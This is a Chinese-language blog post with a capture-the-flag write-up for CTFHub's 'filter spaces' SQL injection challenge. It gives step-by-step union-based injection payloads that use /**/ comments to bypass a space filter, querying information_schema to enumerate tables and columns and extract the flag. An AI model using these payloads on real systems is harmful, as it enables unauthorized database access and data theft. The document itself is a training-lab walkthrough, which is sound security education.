---
layout: post
title: "CTFHub SQL注入 - 过滤空格"
date: 2026-10-13
categories: ctfhub
tags: [ctfhub,web,sql注入,过滤空格,union注入,bypass]
permalink: /ctfhub/sql-filter-space-sqli.html
---

# CTFHub SQL注入 - 过滤空格
## 一、题目信息
平台：CTFHub
分类：Web - SQL注入
题目名称：过滤空格
难度：简单
Flag：`ctfhub{xxxxxxxxxxxx}`

## 二、考点
1. 整数型Union联合SQL注入
2. 空格过滤绕过，使用MySQL内联注释`/**/`代替空格
3. MySQL元数据库`information_schema`查询库、表、字段
4. `group_concat`函数一次性导出多条数据

## 三、题目内容
页面提供ID输入框，点击Search提交，后端将输入内容直接拼入SQL查询语句。题目过滤了普通空格，直接提交带空格的SQL注入语句会失效。
MySQL支持内联注释`/**/`，注释不会被解析执行，可以充当空格分隔SQL关键字，以此绕过空格过滤，完成联合注入。

## 四、解题步骤
1. 判断注入点与回显位
Payload：`-1/**/union/**/select/**/1,2`
提交查询，页面Data区域回显数字2。证明查询结果一共2列，第2列可以用来回显我们查询的数据。

2. 查询当前数据库名
Payload：`-1/**/union/**/select/**/1,database()`
提交查询，得到当前数据库名称：`sqli`。

3. 查询库内所有表名
Payload：`-1/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()`
执行后返回两张表：`news`、`wsanejlyon`。news为新闻数据表格，`wsanejlyon`为存储flag的目标表。

4. 查询目标flag表的字段名
Payload：`-1/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name='wsanejlyon'`
执行获取表内字段，得到存flag的字段为`sxnrsacxvu`。

5. 查询flag数据
Payload：`-1/**/union/**/select/**/1,sxnrsacxvu/**/from/**/wsanejlyon`
提交Payload，页面直接回显最终flag。

## 六、知识点解析
1. 空格绕过：本题过滤空格，MySQL内联注释`/**/`不会被数据库执行，仅作为关键字之间的分隔符，用来替代空格实现注入。
2. union联合查询：`union`可以合并两条select查询的结果，要求前后查询字段数量必须一致。使用`-1`让前面原始查询无返回结果，页面只展示我们自定义查询的数据。
3. group_concat：将多条查询结果合并为一行字符串，一次性获取全部表名或字段名，减少多次发包查询。

## 七、总结
本题属于基础Union注入加简单字符过滤绕过。注入逻辑和普通整数型联合注入完全一致，唯一改动就是Payload里面所有空格全部替换成`/**/`，以此绕过空格过滤。遇到MySQL注入过滤空格时，可以优先尝试`/**/`进行绕过。
